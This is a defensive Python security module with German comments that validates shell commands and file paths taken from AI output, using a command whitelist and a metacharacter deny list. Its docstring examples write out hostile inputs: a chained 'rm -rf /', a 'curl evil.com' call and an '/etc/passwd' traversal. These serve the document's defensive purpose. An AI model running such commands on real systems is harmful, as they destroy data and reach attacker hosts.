# -*- coding: utf-8 -*-
"""
Author: rahn
Datum: 25.01.2026
Version: 1.1
Beschreibung: Security Utilities - Sichere Pfad- und Befehlsoperationen.
              Features: Path Traversal Prevention, Command Injection Prevention, Dateinamen-Sanitization.
              ÄNDERUNG 25.01.2026: Bug-Fix für Duplikat-Dateinamen durch LLM-Fehler.
"""

import os
import re
from typing import List

from exceptions import SecurityError


def safe_join_path(base_path: str, filename: str) -> str:
    """
    Sicherer Path-Join mit Containment-Validierung.

    Verhindert Path Traversal Angriffe durch:
    1. Entfernung von '..' Sequenzen
    2. Normalisierung des Pfads
    3. Containment-Check gegen Base Path

    Args:
        base_path: Basis-Verzeichnis (trusted)
        filename: Dateiname (untrusted, z.B. aus AI-Output)

    Returns:
        Sicherer absoluter Pfad

    Raises:
        SecurityError: Bei Path Traversal Versuch oder ungültigem Dateinamen

    Example:
        >>> safe_join_path("/projects/myapp", "src/main.py")
        '/projects/myapp/src/main.py'

        >>> safe_join_path("/projects/myapp", "../../../etc/passwd")
        SecurityError: Path traversal detected
    """
    if not filename:
        raise SecurityError("Empty filename provided")

    # Normalize base path
    base_abs = os.path.abspath(os.path.normpath(base_path))

    # Sanitize filename first
    clean_filename = sanitize_filename(filename)

    # Fallback wenn leer nach Sanitization
    if not clean_filename:
        raise SecurityError("Invalid filename after sanitization")

    # Join und normalize
    full_path = os.path.abspath(os.path.normpath(os.path.join(base_abs, clean_filename)))

    # CRITICAL: Containment check - Der resultierende Pfad MUSS im base_path bleiben
    # Wir fügen os.sep hinzu um sicherzustellen, dass "/projects/myapp" nicht
    # mit "/projects/myapp_evil" matcht
    if not (full_path.startswith(base_abs + os.sep) or full_path == base_abs):
        raise SecurityError(f"Path traversal detected: {filename} -> {full_path}")

    return full_path


# Whitelist für erlaubte Run-Commands
ALLOWED_RUN_PATTERNS: List[str] = [
    r'^python\s+[\w\-./]+\.py(\s+[\w\-=.]+)*$',      # python script.py [args]
    r'^python\s+-m\s+[\w.]+(\s+[\w\-=.]+)*$',        # python -m module [args]
    r'^python3\s+[\w\-./]+\.py(\s+[\w\-=.]+)*$',     # python3 script.py [args]
    r'^node\s+[\w\-./]+\.js(\s+[\w\-=.]+)*$',        # node script.js [args]
    r'^npm\s+(start|run\s+[\w\-]+)$',                # npm start / npm run script
    r'^start\s+[\w\-./]+\.(html|htm)$',              # start file.html (Windows)
    r'^pip\s+install\s+-r\s+[\w\-./]+\.txt$',        # pip install -r requirements.txt
    r'^pip\s+install\s+[\w\-=.<>]+$',                # pip install package
]

# Gefährliche Shell-Zeichen die Command Injection ermöglichen
DANGEROUS_SHELL_CHARS: List[str] = [
    '&',   # Command chaining (cmd1 & cmd2)
    '|',   # Pipe (cmd1 | cmd2)
    ';',   # Command separator (cmd1; cmd2)
    '`',   # Command substitution (`cmd`)
    '$',   # Variable expansion / command substitution $(cmd)
    '>',   # Output redirection
    '<',   # Input redirection
    '(',   # Subshell
    ')',   # Subshell
    '{',   # Brace expansion
    '}',   # Brace expansion
    '\n',  # Newline (command separator)
    '\r',  # Carriage return
]


def validate_shell_command(cmd: str) -> bool:
    """
    Validiert, dass ein Shell-Befehl erlaubt ist.

    Prüft gegen:
    1. Gefährliche Shell-Metazeichen
    2. Whitelist von erlaubten Befehlsmustern

    Args:
        cmd: Shell-Befehl aus AI-Output

    Returns:
        True wenn der Befehl erlaubt ist, False sonst

    Example:
        >>> validate_shell_command("python app.py")
        True

        >>> validate_shell_command("python app.py; rm -rf /")
        False

        >>> validate_shell_command("python app.py & curl evil.com")
        False
    """
    if not cmd or not cmd.strip():
        return True  # Leerer Befehl ist OK

    cmd = cmd.strip()

    # Blockiere gefährliche Zeichen
    for char in DANGEROUS_SHELL_CHARS:
        if char in cmd:
            return False

    # Prüfe gegen Whitelist
    for pattern in ALLOWED_RUN_PATTERNS:
        if re.match(pattern, cmd, re.IGNORECASE):
            return True

    return False


def sanitize_filename(filename: str) -> str:
    """
    Sanitisiert einen Dateinamen für sichere Verwendung.

    Entfernt/ersetzt:
    - Bekannte Präfixe (FILENAME:, FILE:, etc.)
    - Führende Slashes
    - Windows-illegale Zeichen
    - Path Traversal Sequenzen (..)
    - Doppelte Slashes

    Args:
        filename: Roher Dateiname (z.B. aus AI-Output)

    Returns:
        Sanitisierter Dateiname

    Example:
        >>> sanitize_filename("FILENAME: src/main.py")
        'src/main.py'

        >>> sanitize_filename("../../etc/passwd")
        'etc/passwd'

        >>> sanitize_filename("file:name?.txt")
        'file_name_.txt'
    """
    if not filename:
        return ""

    # Entferne FILENAME: Präfixe (case-insensitive)
    prefixes = ["FILENAME:", "FILE:", "PATH:", "DATEI:", "PFAD:"]
    for prefix in prefixes:
        if filename.upper().startswith(prefix.upper()):
            filename = filename[len(prefix):].strip()

    # ÄNDERUNG 25.01.2026: Bug-Fix für Duplikat-Dateinamen durch LLM-Fehler
    # Erkennung von Mustern wie "file.ext\file.ext" oder "file.ext_\file.ext"
    # Dies passiert wenn der LLM fälschlicherweise den Dateinamen wiederholt
    if '\\' in filename or '/' in filename:
        parts = [p for p in re.split(r'[/\\]', filename) if p]
        if len(parts) >= 2:
            # Normalisiere für Vergleich (ohne trailing _ und lowercase)
            first_base = parts[0].rstrip('_').lower()
            last_base = parts[-1].rstrip('_').lower()
            # Wenn erster und letzter Teil gleich sind → Duplikat-Fehler
            if first_base == last_base or first_base.startswith(last_base) or last_base.startswith(first_base):
                # Behalte den saubereren Teil (ohne trailing _)
                filename = parts[-1] if not parts[-1].endswith('_') else parts[0].rstrip('_')

    # Entferne führende Slashes und Backslashes
    filename = filename.lstrip("/\\")

    # Ersetze Windows-illegale Zeichen
    illegal_chars = [':', '*', '?', '"', '<', '>', '|']
    for char in illegal_chars:
        filename = filename.replace(char, '_')

    # CRITICAL: Entferne alle .. Sequenzen (Path Traversal)
    # Wir machen das iterativ, falls jemand "....." versucht
    while '..' in filename:
        filename = filename.replace('..', '')

    # Entferne doppelte Slashes die durch Sanitization entstanden sein könnten
    while '//' in filename:
        filename = filename.replace('//', '/')
    while '\\\\' in filename:
        filename = filename.replace('\\\\', '\\')

    # Normalize path separators für das aktuelle OS
    filename = filename.replace('\\', os.sep).replace('/', os.sep)

    # Entferne führende/trailing Whitespace und Slashes nochmals
    filename = filename.strip().strip('/\\')

    # ÄNDERUNG 24.01.2026: Fix für trailing Unterstriche
    # Entferne trailing Unterstriche die durch Sanitization von : entstanden sind
    # (z.B. "index.html:" wird zu "index.html_" durch Zeile 182, dann hier zu "index.html")
    filename = filename.rstrip('_')

    return filename


def is_safe_path(base_path: str, target_path: str) -> bool:
    """
    Prüft, ob ein Zielpfad sicher innerhalb eines Basispfads liegt.

    Args:
        base_path: Basis-Verzeichnis (trusted)
        target_path: Zu prüfender Pfad

    Returns:
        True wenn target_path innerhalb von base_path liegt

    Example:
        >>> is_safe_path("/projects", "/projects/myapp/src/main.py")
        True

        >>> is_safe_path("/projects", "/etc/passwd")
        False
    """
    base_abs = os.path.abspath(os.path.normpath(base_path))
    target_abs = os.path.abspath(os.path.normpath(target_path))

    return target_abs.startswith(base_abs + os.sep) or target_abs == base_abs
